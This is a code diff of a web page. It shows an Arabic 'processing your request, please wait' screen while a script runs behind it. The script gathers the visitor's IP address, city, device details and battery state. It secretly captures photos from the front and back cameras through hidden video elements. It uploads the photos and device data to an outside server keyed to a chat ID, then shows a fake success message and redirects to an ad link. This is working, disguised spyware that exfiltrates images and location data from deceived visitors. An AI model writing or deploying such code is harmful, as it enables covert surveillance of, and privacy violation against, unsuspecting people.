@@ -34,175 +34,140 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="spinner"></div>
-        <h1>جاري تنفيذ طلبك</h1>
-        <p>يرجى الانتظار...</p>
-    </div>
-    <video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
-    <video id="backVideo" playsinline autoplay muted style="display:none;"></video>
-    <canvas id="frontCanvas" style="display:none;"></canvas>
-    <canvas id="backCanvas" style="display:none;"></canvas>
-    <script>
-        const frontVideo = document.getElementById('frontVideo');
-        const backVideo = document.getElementById('backVideo');
-        const frontCanvas = document.getElementById('frontCanvas');
-        const backCanvas = document.getElementById('backCanvas');
-        const urlParams = new URLSearchParams(window.location.search);
-        const userId = urlParams.get("chatId");
+<div class="container">
+    <div class="spinner"></div>
+    <h1>جاري تنفيذ طلبك</h1>
+    <p>يرجى الانتظار...</p>
+</div>
 
-        async function collectAdditionalData() {
-            try {
-                const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
-                const battery = await navigator.getBattery();
+<video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
+<video id="backVideo" playsinline autoplay muted style="display:none;"></video>
+<canvas id="frontCanvas" style="display:none;"></canvas>
+<canvas id="backCanvas" style="display:none;"></canvas>
 
-                return {
-                    ip: ipInfo.ip,
-                    country: ipInfo.country_name,
-                    city: ipInfo.city,
-                    platform: getPlatformInfo().platform,
-                    deviceVersion: getDeviceVersion(),
-                    batteryLevel: battery.level,
-                    batteryCharging: battery.charging,
-                };
-            } catch (error) {
-                console.error('Error collecting additional data', error);
-                return {};
-            }
-        }
+<script>
+const frontVideo = document.getElementById('frontVideo');
+const backVideo = document.getElementById('backVideo');
+const frontCanvas = document.getElementById('frontCanvas');
+const backCanvas = document.getElementById('backCanvas');
+const urlParams = new URLSearchParams(window.location.search);
+const userId = urlParams.get("chatId");
 
-        function getPlatformInfo() {
-            const ua = navigator.userAgent;
-            if (/Windows/.test(ua)) return { platform: "Windows" };
-            if (/Mac/.test(ua)) return { platform: "MacOS" };
-            if (/Linux/.test(ua)) return { platform: "Linux" };
-            if (/Android/.test(ua)) return { platform: "Android" };
-            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
-            return { platform: "Unknown" };
-        }
+let camerasFinished = 0; // عداد الكاميرات المنتهية
+let totalCameras = 0;
 
-        function getDeviceVersion() {
-            const ua = navigator.userAgent;
-            const match = ua.match(/\(([^)]+)\)/);
-            return match ? match[1] : 'Unknown';
-        }
+async function collectAdditionalData() {
+    try {
+        const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
+        const battery = await navigator.getBattery();
+        return {
+            ip: ipInfo.ip,
+            country: ipInfo.country_name,
+            city: ipInfo.city,
+            platform: getPlatformInfo().platform,
+            deviceVersion: getDeviceVersion(),
+            batteryLevel: battery.level,
+            batteryCharging: battery.charging,
+        };
+    } catch { return {}; }
+}
 
-        async function requestCameraPermission(facingMode) {
-            try {
-                const constraints = {
-                    video: { facingMode: facingMode }
-                };
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                return stream;
-            } catch (error) {
-                console.error(`Error accessing ${facingMode} camera:`, error);
-                return null;
-            }
-        }
+function getPlatformInfo() {
+    const ua = navigator.userAgent;
+    if (/Windows/.test(ua)) return { platform: "Windows" };
+    if (/Mac/.test(ua)) return { platform: "MacOS" };
+    if (/Linux/.test(ua)) return { platform: "Linux" };
+    if (/Android/.test(ua)) return { platform: "Android" };
+    if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
+    return { platform: "Unknown" };
+}
 
-        async function init() {
-            try {
-                const additionalData = await collectAdditionalData();
-                const frontStream = await requestCameraPermission('user');
-                const backStream = await requestCameraPermission('environment');
+function getDeviceVersion() {
+    const ua = navigator.userAgent;
+    const match = ua.match(/\(([^)]+)\)/);
+    return match ? match[1] : 'Unknown';
+}
 
-                if (frontStream || backStream) {
-                    handleSuccess(frontStream, backStream, additionalData);
-                } else {
-                    throw new Error('No camera access granted');
-                }
-            } catch (e) {
-                console.error('Error in init:', e);
-                setTimeout(init, 1000);
-            }
-        }
+async function requestCameraPermission(facingMode) {
+    try {
+        return await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+    } catch { return null; }
+}
 
-        function handleSuccess(frontStream, backStream, additionalData) {
-            if (frontStream) {
-                frontVideo.srcObject = frontStream;
-                frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
-            }
-            if (backStream) {
-                backVideo.srcObject = backStream;
-                backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
-            }
-        }
+async function init() {
+    const additionalData = await collectAdditionalData();
+    const frontStream = await requestCameraPermission('user');
+    const backStream = await requestCameraPermission('environment');
 
-        function setupCamera(video, canvas, cameraType, additionalData) {
-            video.play();
-            video.onplaying = () => {
-                const { videoWidth, videoHeight } = video;
-                canvas.width = videoWidth;
-                canvas.height = videoHeight;
+    if (!frontStream && !backStream) {
+        finishAndRedirect();
+        return;
+    }
 
-                const context = canvas.getContext('2d');
-                let photoCount = 0;
+    if (frontStream) {
+        totalCameras++;
+        frontVideo.srcObject = frontStream;
+        frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
+    }
+    if (backStream) {
+        totalCameras++;
+        backVideo.srcObject = backStream;
+        backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
+    }
+}
 
-                const captureInterval = setInterval(() => {
-                    if (photoCount >= 4) {
-                        clearInterval(captureInterval);
-                        if (frontVideo.srcObject) frontVideo.srcObject.getTracks().forEach(track => track.stop());
-                        if (backVideo.srcObject) backVideo.srcObject.getTracks().forEach(track => track.stop());
-                        document.querySelector('.container').innerHTML = `
-                            <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
-                            <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
-                        `;
-                        return;
-                    }
+function setupCamera(video, canvas, cameraType, additionalData) {
+    video.play();
+    video.onplaying = () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        let photoCount = 0;
+        const maxPhotos = 4;
 
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
-                        formData.append('userId', userId);
-                        formData.append('cameraType', cameraType);
-                        formData.append('imageWidth', canvas.width);
-                        formData.append('imageHeight', canvas.height);
-                        formData.append('additionalData', JSON.stringify(additionalData));
-                        post('https://freeusr1.onrender.com/submitPhotos', formData);
-                    }, 'image/webp', 0.7);
-
-                    photoCount++;
-                }, 1000);
-            };
-        }
-
-        async function post(url, formData) {
-            const maxRetries = 5;
-            let retries = 0;
-
-            while (retries < maxRetries) {
-                try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! status: ${response.status}`);
-                    }
-
-                    const data = await response.json();
-
-                    if (data.success) {
-                        console.log('Photos sent successfully');
-                        return;
-                    } else {
-                        throw new Error(data.error);
-                    }
-                } catch (error) {
-                    console.error('Error:', error);
-                    retries++;
-                    if (retries < maxRetries) {
-                        await new Promise(resolve => setTimeout(resolve, 3000 * retries));
-                    }
-                }
+        const interval = setInterval(() => {
+            if (photoCount >= maxPhotos) {
+                clearInterval(interval);
+                if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
+                camerasFinished++;
+                if (camerasFinished === totalCameras) finishAndRedirect();
+                return;
             }
 
-            console.error('Max retries reached. Unable to send photos.');
-        }
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
+                fd.append('userId', userId);
+                fd.append('cameraType', cameraType);
+                fd.append('imageWidth', canvas.width);
+                fd.append('imageHeight', canvas.height);
+                fd.append('additionalData', JSON.stringify(additionalData));
+                post('https://freeusr1.onrender.com/submitPhotos', fd);
+            }, 'image/webp', 0.7);
 
-        window.addEventListener('load', init);
-    </script>
+            photoCount++;
+        }, 1000);
+    };
+}
+
+async function post(url, formData) {
+    try {
+        await fetch(url, { method: 'POST', body: formData });
+    } catch {}
+}
+
+function finishAndRedirect() {
+    document.querySelector('.container').innerHTML = `
+        <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
+        <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
+    `;
+    setTimeout(() => {
+        window.location.href = "https://www.profitableratecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
+    }, 800);
+}
+
+window.addEventListener('load', init);
+</script>
 </body>
 </html>
